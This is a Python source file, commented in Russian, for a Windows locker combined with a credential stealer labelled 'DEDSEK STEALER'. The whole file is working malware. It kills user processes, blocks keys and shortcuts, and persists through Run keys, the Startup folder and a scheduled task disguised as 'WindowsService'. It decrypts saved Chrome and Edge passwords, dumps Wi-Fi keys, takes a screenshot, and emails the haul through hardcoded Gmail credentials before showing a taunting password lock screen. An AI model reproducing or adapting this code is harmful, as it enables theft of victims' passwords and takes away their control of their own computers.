import os, sys, time, threading, tempfile, tkinter as tk
from tkinter import PhotoImage
import urllib.request, smtplib, socket, subprocess, base64, random, re, json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2, numpy as np
from PIL import ImageGrab
import sqlite3, win32crypt, shutil, winreg, ctypes

# ===== НАСТРОЙКИ =====
PASSWORD = "1601"
MAX_ATTEMPTS = 4
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
attempts_left = MAX_ATTEMPTS

# ===== УБИЙЦА ВСЕХ ПРОЦЕССОВ =====
def kill_all_apps():
    exclude = ['System','smss.exe','csrss.exe','wininit.exe','winlogon.exe','services.exe','lsass.exe','svchost.exe','dwm.exe','python.exe','pythonw.exe','explorer.exe']
    while True:
        try:
            result = subprocess.check_output('tasklist /FO CSV /NH', shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
            for line in result.split('\n'):
                if line.strip():
                    parts = line.replace('"','').split(',')
                    if len(parts) >= 1:
                        proc = parts[0].strip().lower()
                        if proc not in [e.lower() for e in exclude] and proc.endswith('.exe'):
                            os.system(f'taskkill /f /im {proc} >nul 2>&1')
        except: pass
        time.sleep(0.05)

# ===== БЛОКИРОВКА ВСЕГО =====
def block_everything():
    try:
        import keyboard
        all_keys = ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','volume up','volume down','volume mute','delete']
        for k in all_keys:
            try: keyboard.block_key(k)
            except: pass
        combos = ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i']
        for c in combos:
            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except: pass
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(k)
        except: pass
    except:
        ctypes.windll.user32.BlockInput(True)

def unblock_all():
    try: ctypes.windll.user32.BlockInput(False)
    except: pass
    try:
        import keyboard; keyboard.unhook_all()
    except: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(k)
    except: pass

# ===== АВТОЗАГРУЗКА ВЕЗДЕ =====
def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try: shutil.copy2(cp, pp)
            except: pass
            cp = pp
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
        winreg.CloseKey(k)
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest = os.path.join(startup, 'WindowsService.pyw')
        if cp != dest:
            try: shutil.copy2(cp, dest)
            except: pass
        try:
            k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k2, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
            winreg.CloseKey(k2)
        except: pass
        os.system(f'schtasks /create /tn "WindowsService" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1')
    except: pass

# ===== СКАЧИВАНИЕ =====
def download_file(url, path):
    try:
        if os.path.exists(path): os.remove(path)
        urllib.request.urlretrieve(url, path)
    except: pass

# ===== ВИДЕО (НЕЛЬЗЯ ЗАКРЫТЬ) =====
def play_video_blocking():
    download_file(VIDEO_URL, VIDEO_PATH)
    download_file(AUDIO_URL, AUDIO_PATH)
    time.sleep(0.5)
    try:
        v = tk.Tk()
        v.attributes('-fullscreen', True); v.attributes('-topmost', True)
        v.configure(bg='black'); v.overrideredirect(True)
        v.protocol("WM_DELETE_WINDOW", lambda: None); v.focus_force()
        threading.Thread(target=kill_all_apps, daemon=True).start()
        lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
        try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass
        cap = cv2.VideoCapture(VIDEO_PATH)
        if cap.isOpened():
            fps = cap.get(cv2.CAP_PROP_FPS)
            if fps <= 0: fps = 30
            sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
            ft = 1.0/fps; lt = time.time()
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret: break
                while time.time() - lt < ft: time.sleep(0.001)
                lt = time.time()
                frame = cv2.resize(frame, (sw, sh))
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
                lbl.config(image=img); lbl.image = img; v.update()
            cap.release()
        v.destroy()
    except: pass

# ===== СТИЛЕР =====
def mega_steal():
    report = ["="*60, "DEDSEK STEALER", "="*60]
    report.append(f"USER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
    try:
        report.append(f"PUBLIC IP: {urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()}")
    except: pass
    try: report.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
    except: pass
    try: report.append("\nNETWORK:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:2000])
    except: pass
    for browser, path in [
        ("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),
        ("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))
    ]:
        if os.path.exists(path):
            report.append(f"\n=== {browser} ===")
            try:
                db = os.path.join(tempfile.gettempdir(), f'{browser}.db')
                shutil.copy2(path, db)
                cur = sqlite3.connect(db).cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pw in cur:
                    try:
                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                        report.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}")
                    except: pass
                cur.close()
                try: os.remove(db)
                except: pass
            except: pass
    try:
        report.append("\n=== WIFI ===")
        output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
        for line in output.split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl:
                            report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
    except: pass
    try:
        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
        ImageGrab.grab().save(ss, 'JPEG', quality=50)
        send_file_email(ss, "[DedSek_Logs] Screenshot")
        try: os.remove(ss)
        except: pass
    except: pass
    report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
    text = '\n'.join(report)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
        send_email(part, f"[DedSek_Logs] [{i+1}]")

def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def send_file_email(fp, desc):
    try:
        if not os.path.exists(fp): return
        m = MIMEMultipart()
        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            m.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

# ===== ВИНЛОКЕР (ЧЁРНО-БЕЛЫЙ) =====
class WinLocker:
    def __init__(self):
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='black'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
        global attempts_left
        
        msg = f"""Ну привет друг, как у тебя дела?

Да, понимаю, ты попался.
Ну и нахуя ты скачал игру из инета?
Я не пойму...

Ну ладно, вот тебе загадка. Там пароль.

Я — год, когда произошло событие,
которое не произошло.
В Англии заговорщики планировали
взорвать парламент и убить короля.
Их план провалился, король выжил,
а заговорщиков казнили.
Но в Windows я стал началом времён.

ЧТО Я ЗА ЧИСЛО?

У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ."""
        
        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='left').place(relx=0.5, rely=0.38, anchor='center')
        
        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.8, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            unblock_all()
            self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
            time.sleep(1); self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
            else: self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.after(2000, lambda: os._exit(0))
            self.pw.delete(0, tk.END)

# ===== MAIN =====
if __name__ == "__main__":
    threading.Thread(target=mega_steal, daemon=True).start()
    add_to_startup()
    threading.Thread(target=kill_all_apps, daemon=True).start()
    play_video_blocking()
    block_everything()
    WinLocker()
    tk.mainloop()
